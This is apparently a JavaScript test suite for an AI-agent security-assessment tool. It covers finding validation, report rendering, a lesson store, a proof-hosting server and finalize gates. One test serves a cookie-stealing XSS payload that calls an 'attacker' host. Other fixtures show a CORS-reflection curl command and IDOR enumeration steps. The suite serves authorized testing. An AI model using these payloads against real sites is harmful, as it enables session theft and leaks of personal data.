  const factEvidence6 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "登录态 GET /api/profile -> 200 {\"phone\":\"138****\"}", confidence: 0.9 }, parent)).id;
  const base = {
    intentId: intent.id,
    title: "CORS 反射",
    severity: "low",
    impact: "攻击者可托管恶意页面诱导已登录用户访问，跨域读取响应内容并批量收集平台用户资料用于精准诈骗",
    affectedScope: "全站",
    remediation: "收紧 CORS 白名单",
    pocEvidence: ["GET / with Origin: https://evil.example -> ACAO 反射 + ACAC true"],
    reproducibleSteps: ["curl -H 'Origin: https://evil.example' https://example.test/"]
  };
  // 缺 victimImpact → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户点击", concreteLossEvidence: [factEvidence6] }, parent),
    /victimImpact|受害者/,
  );
  // 缺 attackPrerequisites → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", concreteLossEvidence: [factEvidence6] }, parent),
    /attackPrerequisites|利用前提/,
  );
  // 缺 concreteLossEvidence → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击" }, parent),
    /concreteLossEvidence|损失证据/,
  );
  // 证据 id 不可解析 → 拒绝（服务端校验存在性）
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击", concreteLossEvidence: ["fact-999"] }, parent),
    /不可解析|concreteLossEvidence/,
  );
  // src_submit 省略 severity → mapper 回退 info → 准入闸给出弱信号路由信息
  const childGate = h.exec("child-gate", "gate25");
  const { intentId: _omit, severity: _omitSev, ...submitFinding } = { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击", concreteLossEvidence: [factEvidence6] };
  await assert.rejects(
    () => h.run("src_submit", { intentId: intent.id, facts: [], assets: [], findings: [submitFinding] }, childGate),
    /severity=info 已移除|research/,
  );
  // 三要素齐全 + 真实证据指针 → 通过，新字段落库
  await h.run("src_add_finding", { ...base, title: "CORS 反射致资料泄露", victimImpact: "已登录用户的姓名手机号等资料被第三方站点静默读取且全程无感知，可被批量收集倒卖", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户点击；厂商规则若要求自有域则此条不提交", concreteLossEvidence: [factEvidence6] }, parent);
  const state = await h.run("src_state", {}, parent);
  const finding = state.findings.find((row) => row.id === "finding-1");
  assert.ok(finding, "合格 finding 已入库");
  assert.ok((finding.attackPrerequisites ?? "").includes("自有域"), "attackPrerequisites persisted");
  assert.deepEqual(finding.concreteLossEvidence, [factEvidence6], "concreteLossEvidence persisted");
  // src_update_finding 可重写两字段；severity=info 被 schema 拒绝
  const upd = await h.run("src_update_finding", { findingId: finding.id, attackPrerequisites: "更新后的前提：需厂商自有域钓鱼页；任意外域场景按厂商规不收", concreteLossEvidence: [] }, parent);
  assert.ok(upd.updated.includes("attackPrerequisites") && upd.updated.includes("concreteLossEvidence"));
  await assert.rejects(() => h.run("src_update_finding", { findingId: finding.id, severity: "info" }, parent), /invalid arguments|info/);
});

test("[local.16] buildReport 双视角呈现：有 victimImpact 输出两行；缺失时给占位提示；finalize 缺 victimImpact 警告", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rep1");
  await h.run("src_add_goal", { target: "example.test", objective: "report" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
  const childRep = h.exec("child-rep", "rep1");
  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "done", facts: [], assets: [], findings: [] }, childRep);
  const factEvidence7 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /api/order/2 as user A -> order of user B 含收货人地址电话", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", {
    intentId: intent.id,
    title: "越权读取他人订单",
    severity: "high",
    impact: "攻击者遍历订单 ID 即可拉取任意用户订单的收货人、地址与电话，可用于精准诈骗或倒卖数据，危害全量用户",
    victimImpact: "受害用户的收货地址与手机号泄露，可能遭遇诈骗骚扰且无法察觉泄露源头",
    attackPrerequisites: "攻击者仅需注册普通买家账号并遍历订单 ID，无需管理权限",
    concreteLossEvidence: [factEvidence7],
    affectedScope: "全部用户订单",
    remediation: "服务端校验归属",
    pocEvidence: ["GET /api/order/2 as user A -> order of user B"],
    reproducibleSteps: ["登录账号 A", "GET /api/order/2"]
  }, parent);
  // 直接检查报告渲染。
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("**漏洞名称**：越权读取他人订单"), "标准模板名称行");
  assert.ok(report.markdown.includes("③ 利用过程：攻击者遍历订单 ID"), "利用过程 in 攻击链③");
  assert.ok(report.markdown.includes("⑤ 受害者影响：受害用户的收货地址"), "受害者影响 in 攻击链⑤");
  // 缺失场景：第二个 finding 不带 victimImpact
  await h.run("src_add_intent", { title: "信息泄露复核", detail: "d", goalId: state.goal.id }, parent).catch(() => {});
  const intents = await h.run("src_state", {}, parent);
  const intent2 = intents.intents.find((row) => row.title === "信息泄露复核");
  if (intent2 !== void 0) {
    const childRep2 = h.exec("child-rep2", "rep1");
    await h.run("src_submit", { intentId: intent2.id, stage: "completed", summary: "done", facts: [], assets: [], findings: [] }, childRep2);
    await h.run("src_update_finding", { findingId: "finding-1", victimImpact: "" }, parent);
  }
  const report2 = await h.run("src_report", {}, parent);
  assert.ok(!report2.markdown.includes("⑤ 受害者影响"), "空 victimImpact 不渲染⑤受害者影响行（动态模板：空步骤不占位）");
});

test("[local.16] src_record_lesson/read/search：沉淀合并更新 + goal 索引注入 + finalize 未沉淀警告", async () => {
  const dir = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  process.env.DSH_SRC_LESSONS_DIR = dir;
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("les1");
  // goal 时注入内置经验索引（内置目录随仓库走）
  const goal = await h.run("src_add_goal", { target: "example.test", objective: "lessons" }, parent);
  assert.ok(Array.isArray(goal.lessonIndex), "lesson index present on goal");
  assert.ok(goal.lessonIndex.some((line) => line.includes("CORS")), `builtin cors indexed: ${JSON.stringify(goal.lessonIndex)}`);
  // 沉淀新经验
  const rec = await h.run("src_record_lesson", {
    id: "idor-test",
    vulnType: "水平越权（IDOR）",
    scenario: "接口按自增 ID 取资源且仅校验登录态",
    verificationPlaybook: "双账号 A/B 登录，A 的会话请求 B 的资源 id，比对响应",
    acceptanceCriteria: "A 能读到 B 私有数据即成立，附双方 raw 包",
    pitfalls: "最初只测了未登录访问被拒就下结论——补了双账号对照后才收录"
  }, parent);
  assert.equal(rec.updatedExisting, false);
  // 同 slug 再沉淀 → 合并更新而非新建
  const rec2 = await h.run("src_record_lesson", {
    id: "idor-test",
    vulnType: "水平越权（IDOR）",
    scenario: "同上+补充：uuid 场景也可通过历史接口枚举",
    verificationPlaybook: "双账号 A/B 对照",
    acceptanceCriteria: "读到 B 私有数据"
  }, parent);
  assert.equal(rec2.updatedExisting, true);
  const files = await fsPromises.readdir(dir);
  assert.equal(files.filter((f) => f.startsWith("idor-test")).length, 1, "merged into one file");
  const text = await fsPromises.readFile(nodePath.join(dir, files[0]), "utf8");
  assert.ok(text.includes("# 水平越权（IDOR）") && text.includes("uuid 场景"), "content updated");
  assert.ok(/<!--\s*lesson-meta:\s*\{/.test(text), "meta comment present");
  // read：沉淀优先
  const read = await h.run("src_read_lesson", { id: "idor-test" }, parent);
  assert.equal(read.source, "distilled");
  assert.ok(read.text.includes("uuid 场景"));
  // search
  const search = await h.run("src_search_lessons", { query: "越权" }, parent);
  assert.ok(search.hits.some((hit) => hit.file === "idor-test"), "search finds distilled lesson");
  // 空 hits 分支不抛错（render 引用参数曾用错变量名）
  const empty = await h.run("src_search_lessons", { query: "不存在的关键词xyz" }, parent);
  assert.equal(empty.hits.length, 0, "empty hits returned");
  const searchTool = h.tools.get("src_search_lessons");
  const rendered = searchTool.output.render({ query: "不存在的关键词xyz" }, empty);
  assert.ok(rendered[0].text.includes("经验库无"), "empty-hit render text ok");
  // sessionLessons：本会话已沉淀 → finalize 不再出经验 warning；src_report 附沉淀节
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
  const childLes = h.exec("child-les", "les1");
  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "ok", facts: [], assets: [], findings: [] }, childLes);
  const factEvidence8 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /resume/2 -> 200 求职者姓名电话邮箱", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", {
    intentId: intent.id,
    title: "越权读取简历",
    severity: "high",
    impact: "攻击者遍历简历 ID 可读取任意求职者姓名电话邮箱等隐私数据并批量倒卖，危害全量用户隐私安全",
    victimImpact: "求职者的姓名电话邮箱被陌生人读取，存在被诈骗与骚扰风险且无从察觉",
    attackPrerequisites: "攻击者仅需注册普通账号并遍历简历 ID，无需管理权限",
    concreteLossEvidence: [factEvidence8],
    affectedScope: "全部简历",
    remediation: "校验归属",
    pocEvidence: ["raw"],
    reproducibleSteps: ["step"],
    rawRequest: "GET /resume/2 HTTP/1.1\nHost: x"
  }, parent);
  let finalized = false;
  try {
    await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
    finalized = true;
  } catch (error) {
    // blockers 可能拦（checkpoint 已建），warning 只在成功路径返回——用 message 判别
    assert.ok(!/未沉淀/.test(String(error?.message ?? "")), "no lessons warning in blocker path");
  }
  if (finalized) {
    // 成功时确认没有经验相关 warning
  }
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("本次沉淀的经验"), "report appends lessons section");
  assert.ok(report.markdown.includes("idor-test"), "lesson id listed");
});

test("[local.16] src_serve_proof/src_stop_serve 生命周期：HTTP 托管 + 访问日志 + TTL 上限 + 跨会话隔离", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("srv1");
  await h.run("src_add_goal", { target: "example.test", objective: "serve" }, parent);
  const started = await h.run("src_serve_proof", { payload: "<script>fetch('http://attacker/'+document.cookie)</script>", filename: "poc.html", ttlSeconds: 999999 }, parent);
  assert.equal(started.ttlSeconds, 86400, "TTL clamped to max");
  assert.ok(started.serveId.startsWith("serve-srv1-"), "session-scoped serveId");
  assert.ok(/^http:\/\/\d+\.\d+\.\d+\.\d+:\d+\/poc\.html$/.test(started.url), "LAN url shape: " + started.url);
  // [local.16 裁定] 只给局域网 URL：不返回 localUrl/127.0.0.1 形态，杜绝 POC 写成 localhost
  assert.equal(started.localUrl, void 0, "no localUrl field (rule: no 127.0.0.1/localhost in POCs)");
  assert.ok(!started.url.includes("127.0.0.1") && !started.url.includes("localhost"), "url is LAN IP");
  // HTTP GET 命中内���
  const res = await fetch(started.url);
  const body = await res.text();
  assert.ok(body.includes("<script>"), "payload served");
  // 随意路径也命中同一内容（OOB 探针常用任意路径）
  const probe = await fetch(new URL("/probe?x=1", started.url));
  assert.equal(await probe.text(), body);
  // stop → 日志回传 + 端口关闭
  const stopped = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
  assert.equal(stopped.stopped, true);
  assert.equal(stopped.hits.length, 2, "two hits logged");
  assert.ok(stopped.hits[0].at && stopped.hits[0].ua !== void 0, "hit fields (time + UA)");
  assert.ok(stopped.hits.some((hit) => hit.path === "/probe?x=1"), "probe path recorded");
  await assert.rejects(() => fetch(started.url), "port closed after stop");
  // 再次 stop → 幂等 not-found
  const again = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
  assert.equal(again.stopped, false);
  // 跨会话隔离：另一会话停不掉 srv1 的服务
  const other = h.exec("srv2");
  await h.run("src_add_goal", { target: "other.test", objective: "serve2" }, other);
  const s2 = await h.run("src_serve_proof", { payload: "second", filename: "b.txt", contentType: "text/plain" }, other);
  const cross = await h.run("src_stop_serve", { serveId: s2.serveId }, parent);
  assert.equal(cross.stopped, false, "cross-session stop rejected");
  await h.run("src_stop_serve", { serveId: s2.serveId }, other);
  // [local.16 自查] goal 重置（initGoal 二次调用）自动关闭本会话服务
  await h.run("src_add_goal", { target: "example.test", objective: "restart" }, parent);
  await assert.rejects(() => fetch(started.url), "server closed on goal reset");
});

test("[local.16] src_update_finding 投影折叠：UI 视角（viewSrcState）字段重写/校验拒绝/asset 关联解除", async () => {
  const { srcInitialState, applySrcEvent, viewSrcState } = await import("../lib/src.js");
  const ev = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  const findingOf = (s) => viewSrcState(s).nodes.find((n) => n.kind === "finding");
  let s = srcInitialState;
  s = applySrcEvent(s, ev("src_add_goal", { target: "example.test", objective: "x" }));
  s = applySrcEvent(s, ev("src_add_intent", { title: "t", detail: "d", goalId: "goal-1" }));
  s = applySrcEvent(s, ev("src_add_finding", { intentId: "intent-1", title: "F1", severity: "low", impact: "i".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["g"] }));
  s = applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "medium", victimImpact: "受害者视角内容足够长三十字以上了吧", reproducibleSteps: ["step1", "step2"], title: "F1-renamed" }));
  const f = findingOf(s);
  assert.equal(f.severity, "medium");
  assert.equal(f.title, "F1-renamed");
  assert.ok(f.victimImpact.includes("受害者"));
  assert.equal(f.steps.length, 2);
  // 非法 severity / 未知 id / 无效 asset 引用 → 原样返回
  assert.equal(findingOf(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "catastrophic" }))).severity, "medium");
  assert.ok(!viewSrcState(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-99", title: "ghost" }))).nodes.some((n) => n.title === "ghost"));
  // asset 关联与空串解除
  const s4 = applySrcEvent(s, ev("src_add_asset", { type: "root-domain", value: "a.test" }));
  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" }))).affectedAssetId, "asset-1");
  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }))).affectedAssetId, void 0);
  assert.equal(findingOf(applySrcEvent(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" })), ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "" }))).affectedAssetId, void 0);
});

test("[local.17] 委派子代理执行类工具沿 parentSession 链解析 goal/infra/intent（fork 场景修复）", async () => {
  const h = harness();
  const commander = h.exec("cmd-1");
  // fork 子代理：header.parentSession 指向指挥官；ctx.sessions.get(parent) 无 header 也应终止遍历
  const child = h.exec("child-fork", "cmd-1");

  await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment", authorization: "ticket-42" }, commander);
  const intent = await h.run("src_add_intent", { title: "Bypass filter list", detail: "vector enumeration", goalId: "goal-1" }, commander);
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:18080" }, commander);

  // 修复前：子代理直接调 src_scan_surface 会报 "requires an initialized SRC goal"
  const surface = await h.run("src_scan_surface", { intentId: intent.id, baseUrl: "https://example.test", paths: ["/", "/robots.txt"] }, child);
  assert.ok(surface, "child with fork parent resolves the engagement goal via the parent chain");

  // src_get_infra 子代理可读且读到指挥官的覆盖值
  const infra = await h.run("src_get_infra", {}, child);
  assert.equal(infra.infra.proxyUrl, "http://127.0.0.1:18080");

  // 孙链（两层以上）也能回溯：child2 -> child-fork -> cmd-1
  h.sessions.get("child-fork").header = { parentSession: "cmd-1" };
  const grandchild = h.exec("grandchild", "child-fork");
  const surface2 = await h.run("src_scan_surface", { intentId: intent.id, baseUrl: "https://example.test", paths: ["/robots.txt"] }, grandchild);
  assert.ok(surface2, "two-level chain still resolves the engagement session");
});

test("[local.17] 无链上 goal 时报错文案保持不变（orphan 子代理）", async () => {
  const h = harness();
  const orphan = h.exec("orphan", "nobody");
  await assert.rejects(
    () => h.run("src_scan_surface", { intentId: "intent-x", baseUrl: "https://example.test", paths: ["/"] }, orphan),
    /requires an initialized SRC goal/
  );
});

await test("local.17: src_submit 省略 findings/assets 不再报 invalid arguments", async () => {
  const h = harness();
  const parent = h.exec("parent");
  h.sessions.set("parent", { append() {} });
  const child = h.exec("child", "parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment" }, parent);
  const intent = await h.run("src_add_intent", { title: "Only facts batch", goalId: goal.id }, parent);
  // 只传 facts，省略 assets/findings——此前 parameters required: true 导致 ToolArgsError
  const result = await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "facts only", facts: [{ kind: "info", target: "https://example.test", detail: "server banner", confidence: 0.8 }] }, child);
  assert.deepEqual({ facts: result.facts, assets: result.assets, findings: result.findings }, { facts: 1, assets: 0, findings: 0 });
  // 全部数组都省略也应成功（仅 checkpoint）
  const empty = await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "checkpoint only" }, child);
  assert.equal(empty.facts, 0);
});

test("[capability] src_list_capabilities 读取清单并对照 patch 接线区段", async () => {
  const h = harness();
  const os = await import("node:os");
  const fs = await import("node:fs");
  const path = await import("node:path");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "caps-test-"));
  fs.mkdirSync(path.join(tmp, "profiles", "web"), { recursive: true });
  fs.writeFileSync(path.join(tmp, "capabilities.yaml"), [
    "capabilities:",
    "  - id: alpha",
    "    from: npm:@t/alpha@1.0.0",
    "    enabled: true",
    "    when: >",
    "      测试场景 A 续行",
    "  - id: beta",
    "    from: npm:@t/beta@2.0.0",
    "    enabled: false"
  ].join("\n"));
  fs.writeFileSync(path.join(tmp, "profiles", "web", "cordis.patch.yml"), [
    "# ── dsh-src capabilities:8< 自动生成区段开始 ──",
    "- insert:",
    "    - id: mcp-alpha",
    "# ── dsh-src capabilities:>8 自动生成区段结束 ──"
  ].join("\n"));
  const prevHome = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  try {
    const r = await h.run("src_list_capabilities", {}, h.exec("cmd-1"));
    assert.equal(r.items.length, 2);
    const alpha = r.items.find((x) => x.id === "alpha");
    const beta = r.items.find((x) => x.id === "beta");
    assert.deepEqual({ id: alpha.id, enabled: alpha.enabled, wired: alpha.wired, when: alpha.when }, { id: "alpha", enabled: true, wired: true, when: "测试场景 A 续行" });
    assert.deepEqual({ enabled: beta.enabled, wired: beta.wired }, { enabled: false, wired: false });
    // 清单缺失场景
    process.env.DSH_HOME = path.join(tmp, "nope");
    const r2 = await h.run("src_list_capabilities", {}, h.exec("cmd-2"));
    assert.equal(r2.parseError, "清单未创建");
    assert.deepEqual(r2.items, []);
  } finally {
    if (prevHome === void 0) delete process.env.DSH_HOME; else process.env.DSH_HOME = prevHome;
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("[capability] parseCapsYamlSubset 容错与折叠块", async () => {
  const { execFile } = await import("node:child_process");
  const { promisify } = await import("node:util");
  // 直接经模块内函数不可行（非导出），改由 src_list_capabilities 行为覆盖：畸形文件应报解析失败而非崩溃
  const h = harness();
  const os = await import("node:os");
  const fs = await import("node:fs");
  const path = await import("node:path");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "caps-bad-"));
  fs.writeFileSync(path.join(tmp, "capabilities.yaml"), "garbage line without structure\n");
  const prevHome = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  try {
    const r = await h.run("src_list_capabilities", {}, h.exec("cmd-3"));
    assert.match(r.parseError, /解析失败|应以/);
    assert.deepEqual(r.items, []);
  } finally {
    if (prevHome === void 0) delete process.env.DSH_HOME; else process.env.DSH_HOME = prevHome;
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("[local.20] finalize 收官三闸：blocked 无待办拦截 + 待办关联豁免 + 报告尾节「等你的事」", async () => {
  /* [local.65] 待办闸自身语义：仅由 agent 主动挂的待办触发。 */
  const h = harness();
  const parent = h.exec("g20");
  await h.run("src_add_goal", { target: "https://shop.example.test", objective: "收官闸门", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "登录态越权面", detail: "需商家账号", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "blocked" }, parent);
  // 闸②：blocked intent 存在但从未建任何待办 → blocker
  const noTodo = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(noTodo.ready, false);
  assert.match(noTodo.blockers.join(" "), /标记为 blocked 但从未创建任何用户待办/);
  // 建待办（intentId 关联）后闸②解除；闸①pending 待办仍拦
  await h.run("src_user_todo", { title: "登录 shop.example.test 提供商家会话", kind: "auth-session", intentId: "intent-1" }, parent);
  const withTodo = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(withTodo.ready, false, "pending todo blocks finalize");
  assert.match(withTodo.blockers.join(" "), /未完成的用户待办/);
  assert.doesNotMatch(withTodo.blockers.join(" "), /从未创建任何用户待办/, "linked todo clears gate 2");
  // allowIncomplete 越过两闸
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "用户指示暂停" }, parent);
  assert.equal(allowed.ready, true);
  // 报告尾节：pending 待办 + blocked intent 都进「⏸ 等你的事」
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /⏸ 等你的事/);
  assert.match(report.markdown, /登录 shop\.example\.test 提供商家会话/);
  assert.match(report.markdown, /intent-1\/登录态越权面/);
});

test("[local.20] finalize remainingDirections 必填：缺失抛错、非空拦截、空数组放行", async () => {
  const h = harness();
  const parent = h.exec("g20b");
  await h.run("src_add_goal", { target: "example.test", objective: "方向闸", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  await assert.rejects(() => h.run("src_finalize_engagement", {}, parent), /remainingDirections/);
  const listed = await h.run("src_finalize_engagement", { remainingDirections: ["深挖 /api/admin 越权", "GraphQL schema 复核"], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(listed.ready, false);
  assert.match(listed.blockers.join(" "), /可继续推进的方向却要求收官/);
  assert.match(listed.blockers.join(" "), /GraphQL schema 复核/, "directions echoed back");
});

test("[local.22] blindSpots 覆盖维度声明闸：缺项/无证据/信号派生/报告渲染", async () => {
  const h = harness();
  const parent = h.exec("g22bs");
  await h.run("src_add_goal", { target: "https://example.test", objective: "盲区闸", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);

  // ① 缺 blindSpots 参数 → throw
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [] }, parent), /blindSpots/);

  // ② 缺项：漏 cors-headers 等 → blocker
  const partial = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.equal(partial.ready, false);
  assert.match(partial.blockers.join(" "), /覆盖维度声明缺项/);
  assert.match(partial.blockers.join(" "), /cors-headers/);

  // ③ covered 无 evidenceId → blocker
  const noEvidence = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.equal(noEvidence.ready, false);
  assert.match(noEvidence.blockers.join(" "), /evidenceId 缺失或不可解析/);
  assert.match(noEvidence.blockers.join(" "), /http-authz-surface/);

  // ④ covered 带真实 evidenceId → 放行；uncovered 多账号无待办 → warning
  const withEvidence = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered", evidenceId: "intent-1" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "uncovered", note: "缺第二测试账号" },
  ] }, parent);
  assert.match(withEvidence.warnings.join(" "), /multi-account-cross-authz|未建对应 src_user_todo/);

  // ⑤ 信号派生：wss 资产存在却未声明 websocket → 缺项阻断
  await h.run("src_add_asset", { type: "endpoint", value: "wss://api.example.test/ws", source: "JS 提取", meta: "api:websocket" }, parent);
  const wsMissing = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "notApplicable" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.match(wsMissing.blockers.join(" "), /websocket/);

  // ⑥ allowIncomplete 越过，blindSpots 落 coverage 行 → 报告渲染「覆盖维度声明」
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered", evidenceId: "intent-1", note: "已测" },
    { dimension: "cors-headers", status: "uncovered", note: "未测响应头" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "uncovered", note: "缺多账号" },
    { dimension: "websocket", status: "uncovered", note: "无 ws 客户端能力" },
  ], allowIncomplete: true, allowIncompleteReason: "演示停止" }, parent);
  assert.equal(allowed.ready, true);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /覆盖维度声明/);
  assert.match(report.markdown, /http-authz-surface: 已覆盖/);
  assert.match(report.markdown, /websocket: 未覆盖/);
  assert.match(report.markdown, /无 ws 客户端能力/);
});

test("[local.22] blindSpots schema 校验：非法 status 被框架拒绝", async () => {
  const h = harness();
  const parent = h.exec("g22sch");
  await h.run("src_add_goal", { target: "https://example.test", objective: "schema", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  // 非法 status 值应被 schema 拒绝（框架层 enum 校验）
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "maybe" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent), /maybe|status|enum|invalid/i);
});

test("[local.23/54] testAccounts 列表：登记/去重/投影/凭证库引用/向后兼容单值", async () => {
  const h = harness();
  const parent = h.exec("g23ac");
  await h.run("src_add_goal", { target: "https://example.test", objective: "矩阵", authorization: "t" }, parent);
  // 登记 A 账号（凭据入凭证库，只返回引用）
  const a = await h.run("src_add_test_account", { label: "商家账号A", credential: "Cookie: sid=aaa; role=merchant", note: "商家端" }, parent);
  assert.equal(a.updated, false);
  assert.match(a.id, /^testAccount-/);
  assert.match(a.credentialRef, /^credential:\/\/[a-f0-9]{64}$/);
  // 凭证库文件真实存在且可读回原值
  const { readCredential, credentialVaultDir } = await import("../lib/src/credentials.js");
  const secret = await readCredential({ dshHome: process.env.DSH_HOME, ref: a.credentialRef });
  assert.equal(secret, "Cookie: sid=aaa; role=merchant");
  // 同 label 去重覆盖
  const a2 = await h.run("src_add_test_account", { label: "商家账号A", credential: "Cookie: sid=aaa2" }, parent);
  assert.equal(a2.updated, true);
  assert.equal(a2.id, a.id);
